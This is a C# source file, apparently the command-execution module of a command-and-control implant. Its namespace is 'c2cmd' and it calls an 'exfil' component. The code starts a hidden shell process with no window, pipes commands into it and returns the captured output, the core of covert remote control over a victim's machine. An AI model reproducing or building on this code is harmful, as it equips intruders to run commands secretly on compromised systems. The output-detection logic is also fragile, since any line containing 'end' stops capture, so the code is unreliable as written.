using System.Diagnostics;

namespace c2cmd {
    public class CmdProcessor : IDisposable {
        private Process _cmd;
        private StreamWriter _sw;
        private AutoResetEvent _outputWaitHandle;
        private string _output;
        private static string _appLocation = "";
        public CmdProcessor(string cmdPath) {
            _cmd = new Process();
            _outputWaitHandle = new AutoResetEvent(false);
            _output = String.Empty;
            _appLocation = Directory.GetCurrentDirectory();
            ProcessStartInfo psi = new() {
                FileName = cmdPath,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardInput = true,
                CreateNoWindow = true
            };
            _cmd.OutputDataReceived += _cmd_OutputDataReceived;
            _cmd.StartInfo = psi;
            _cmd.Start();
            _sw = _cmd.StandardInput;
            _cmd.BeginOutputReadLine();
        }
        public string ExecuteCommand(string command) {
            _output = String.Empty;
            _sw.WriteLine(command);
            _sw.WriteLine("end");
            _outputWaitHandle.WaitOne();
            exfil.clearCommand();
            return _output.Replace(_appLocation + ">" + command, "");
        }
        private void _cmd_OutputDataReceived(object sender, DataReceivedEventArgs e) {
            if (e.Data == null || e.Data.Contains("end") || e.Data == _appLocation) {
                _outputWaitHandle.Set();
            }
            else {
                _output += e.Data;
            }
        }
        public void Dispose() {
            _cmd.Close();
            _cmd.Dispose();
            _sw.Close();
            _sw.Dispose();
        }
    }
}